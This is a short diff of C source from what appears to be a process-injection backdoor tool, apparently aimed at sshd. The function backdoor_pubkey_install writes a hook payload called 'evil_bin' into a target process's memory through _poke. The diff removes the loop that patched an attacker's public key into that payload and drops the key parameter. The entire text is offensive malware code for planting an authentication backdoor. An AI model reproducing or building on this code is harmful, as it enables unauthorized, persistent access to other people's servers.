@@ -18,7 +18,7 @@ extern unsigned char hook_pubkey_bin[];
 extern int hook_pubkey_bin_len;
 
 
-void backdoor_pubkey_install(inject_ctx *ctx, char *pubkey) {
+void backdoor_pubkey_install(inject_ctx *ctx) {
 	signature signatures[]={
 		{ 0x1, "key_allowed", "trying public key file %s", 0 },
 		{ 0x2, "restore_uid", "restore_uid: %u/%u"       , 0 },
@@ -174,13 +174,6 @@ void backdoor_pubkey_install(inject_ctx *ctx, char *pubkey) {
 	}
 
 	_poke(ctx->pid, hole_addr, evil_bin, hook_pubkey_bin_len);
-
-	for(i=0; i<hook_pubkey_bin_len; i++) {
-		if (memcmp(evil_bin+i, "\xaa\xbb\xcc\xdd", 4) == 0) {
-			info("inserting pubkey at offset %x in payload", i);
-			_poke(ctx->pid, hole_addr+i, pubkey, strlen(pubkey));
-		}
-	}
 
 	info("poked evil_bin to 0x%lx.", hole_addr);
 }
